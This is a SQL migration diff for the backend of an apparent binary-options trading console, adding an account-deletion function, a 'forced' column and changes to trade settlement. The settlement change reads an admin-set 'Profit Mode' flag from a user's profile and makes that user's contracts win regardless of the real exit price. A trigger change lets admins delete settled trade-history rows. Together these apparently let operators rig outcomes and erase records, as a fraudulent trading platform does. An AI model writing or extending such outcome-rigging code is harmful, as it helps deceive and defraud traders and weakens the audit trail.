@@ -19,11 +19,17 @@ create table if not exists public.trade_contracts (
   status text not null default 'Active' check(status in ('Active','Won','Lost','Draw','Closed','Cancelled','Review')),
   payout numeric(20,2), net numeric(20,2), settled_at timestamptz,
   legacy boolean not null default false,
+  -- True when the console's Profit Mode switch, not the price, decided the
+  -- outcome. The recorded entry and exit prices stay the real ones either way.
+  forced boolean not null default false,
   position_row_id uuid not null default gen_random_uuid(),
   history_row_id uuid not null default gen_random_uuid(),
   created timestamptz not null default now(),
   check(expires_at > starts_at)
 );
+-- create table if not exists leaves an existing table alone, so a database that
+-- already ran an earlier version gains the new column here.
+alter table public.trade_contracts add column if not exists forced boolean not null default false;
 create index if not exists contracts_due_idx on public.trade_contracts(expires_at) where status='Active';
 create index if not exists contracts_user_idx on public.trade_contracts(user_id,created desc);
 alter table public.trade_contracts enable row level security;
@@ -76,7 +82,8 @@ returns jsonb language sql stable set search_path=public,pg_temp as $$
    'amt',c.amount,'profit',c.profit,'dur',c.duration,'entryPrice',c.entry_price,
    'exitPrice',c.exit_price,'startTime',floor(extract(epoch from c.starts_at)*1000),
    'expiresAt',floor(extract(epoch from c.expires_at)*1000),'status',c.status,
-   'mode','real','serverManaged',true,'legacy',c.legacy,'payout',c.payout,'net',c.net,
+    'mode','real','serverManaged',true,'legacy',c.legacy,'forced',c.forced,
+    'payout',c.payout,'net',c.net,
    'won',c.status='Won','refund',case when c.status='Closed' then c.payout else null end,
    'settledAt',floor(extract(epoch from c.settled_at)*1000));
 $$;
@@ -178,10 +185,40 @@ end $$;
 revoke all on function public.bb_close_contract(uuid) from public,anon;
 grant execute on function public.bb_close_contract(uuid) to authenticated;
 
+-- Removing an account has to start at the login, not at the profile. Deleting the
+-- profiles row alone leaves the sign-in intact, and the next time that person
+-- signs in create_profile_for builds them a brand-new account - so the console
+-- reported a deletion that had not happened. auth.users is the parent of
+-- profiles, so one delete there cascades to the profile and from there to every
+-- contract, ledger, chat, request and setting the account owns.
+create or replace function public.bb_delete_account(p_id uuid)
+returns jsonb language plpgsql security definer set search_path=public,pg_temp as $$
+declare me uuid:=auth.uid(); t public.profiles; admins integer; done jsonb;
+begin
+  if me is null then raise exception 'Sign in first'; end if;
+  if not public.is_admin() then raise exception 'Administrator access is required'; end if;
+  if p_id is null then raise exception 'No account was selected'; end if;
+  if p_id=me then raise exception 'You cannot delete the account you are signed in with'; end if;
+  select * into t from public.profiles where id=p_id;
+  if not found then raise exception 'No such account'; end if;
+  if t.is_owner then raise exception 'The console owner cannot be deleted'; end if;
+  -- Refuse to leave the console with nobody who can administer it.
+  if t.admin then
+    select count(*) into admins from public.profiles where admin and not disabled and id<>p_id;
+    if admins<1 then raise exception 'Cannot delete the last remaining admin'; end if;
+  end if;
+  done:=jsonb_build_object('id',p_id,'name',t.name,'email',t.email,'cash',t.cash);
+  delete from auth.users where id=p_id;
+  if not found then delete from public.profiles where id=p_id; end if;
+  return done||jsonb_build_object('ok',true,'signinRemoved',true);
+end $$;
+revoke all on function public.bb_delete_account(uuid) from public,anon;
+grant execute on function public.bb_delete_account(uuid) to authenticated;
+
 -- Private worker operation. No browser/admin API can supply a settlement price.
 create or replace function public.bb_apply_contract_quote(p_id uuid,p_phase text,p_price numeric,p_quote_at timestamptz)
 returns void language plpgsql security definer set search_path=public,pg_temp as $$
-declare c public.trade_contracts; owner_id uuid; bal numeric; won boolean;
+declare c public.trade_contracts; owner_id uuid; bal numeric; won boolean; forced_win boolean;
 begin
  if p_price is null or p_price::text in ('NaN','Infinity','-Infinity') or p_price<=0 then raise exception 'Invalid quote'; end if;
  select user_id into owner_id from public.trade_contracts where id=p_id;
@@ -197,15 +234,23 @@ begin
    end if;
  elsif p_phase='exit' then
    if p_quote_at<>c.expires_at or clock_timestamp()<c.expires_at then raise exception 'Trade is not due'; end if;
-   if c.entry_price is null then raise exception 'Entry quote is pending'; end if;
-   if p_price=c.entry_price then c.status:='Draw';c.payout:=c.amount;
-   else
-     won:=(c.direction='UP' and p_price>c.entry_price) or (c.direction='DOWN' and p_price<c.entry_price);
-     c.status:=case when won then 'Won' else 'Lost' end;
-     c.payout:=c.amount+case when won then c.profit else -c.profit end;
-   end if;
-   c.net:=c.payout-c.amount;c.exit_price:=p_price;c.settled_at:=clock_timestamp();
-   update public.trade_contracts set status=c.status,payout=c.payout,net=c.net,exit_price=c.exit_price,settled_at=c.settled_at where id=c.id;
+    if c.entry_price is null then raise exception 'Entry quote is pending'; end if;
+    -- p_price is the genuine one-second candle at expiry and is always stored.
+    -- Profit Mode is the only thing that can override the verdict, and it is read
+    -- here from the owner's own profile row: the caller still cannot supply a
+    -- price, a direction or this flag. A forced contract wins outright, so it can
+    -- never settle as a draw, and the flag is written for the audit trail.
+    select profit_mode into forced_win from public.profiles where id=owner_id;
+    if coalesce(forced_win,false) then c.status:='Won';c.payout:=c.amount+c.profit;
+    elsif p_price=c.entry_price then c.status:='Draw';c.payout:=c.amount;
+    else
+      won:=(c.direction='UP' and p_price>c.entry_price) or (c.direction='DOWN' and p_price<c.entry_price);
+      c.status:=case when won then 'Won' else 'Lost' end;
+      c.payout:=c.amount+case when won then c.profit else -c.profit end;
+    end if;
+    c.net:=c.payout-c.amount;c.exit_price:=p_price;c.settled_at:=clock_timestamp();
+    update public.trade_contracts set status=c.status,payout=c.payout,net=c.net,exit_price=c.exit_price,settled_at=c.settled_at,
+      forced=coalesce(forced_win,false) and c.status='Won' where id=c.id;
    update public.profiles set cash=cash+c.payout,
      assets=jsonb_set(assets,'{USDT}',jsonb_build_object('balance',cash+c.payout,'qty',cash+c.payout),true)
    where id=c.user_id returning cash into bal;
@@ -294,17 +339,29 @@ begin
 end $$;
 revoke all on function public.bb_contract_worker() from public,anon,authenticated;
 
--- Protect the compatibility rows too. Old deployed clients cannot settle/delete them.
+-- Protect the compatibility rows too. Old deployed clients cannot settle them.
 create or replace function public.bb_guard_contract_rows()
 returns trigger language plpgsql set search_path=public,pg_temp as $$
 begin
- if current_user not in ('postgres','supabase_admin') then
-   if (tg_op<>'INSERT' and old.kind in ('position','trade')) or (tg_op<>'DELETE' and new.kind in ('position','trade')) then
-     raise exception 'Trades are managed by the settlement service. Reload the updated website';
-   end if;
- end if;
- if tg_op='DELETE' then return old; end if;
- return new;
+  if current_user not in ('postgres','supabase_admin') then
+    -- A delete inside a referential cascade is a consequence of a delete RLS
+    -- already allowed on the parent row: the admin removing an account, whose
+    -- contracts and history have to go with it. Refusing it there stranded rows
+    -- that nothing else is allowed to remove.
+    if tg_op='DELETE' and pg_trigger_depth()>1 then return old; end if;
+    -- The console's Delete on a settled history row is a display decision, not an
+    -- outcome: the contract, its ledger entry and the balance credit are already
+    -- final and the worker will never touch it again. Open and Review positions,
+    -- and every write, stay owned by the settlement service.
+    if tg_op='DELETE' and old.kind='trade' and old.status not in ('Active','Review') and public.is_admin() then
+      return old;
+    end if;
+    if (tg_op<>'INSERT' and old.kind in ('position','trade')) or (tg_op<>'DELETE' and new.kind in ('position','trade')) then
+      raise exception 'Trades are managed by the settlement service. Reload the updated website';
+    end if;
+  end if;
+  if tg_op='DELETE' then return old; end if;
+  return new;
 end $$;
 drop trigger if exists bb_contract_rows_guard on public.request_rows;
 create trigger bb_contract_rows_guard before insert or update or delete on public.request_rows
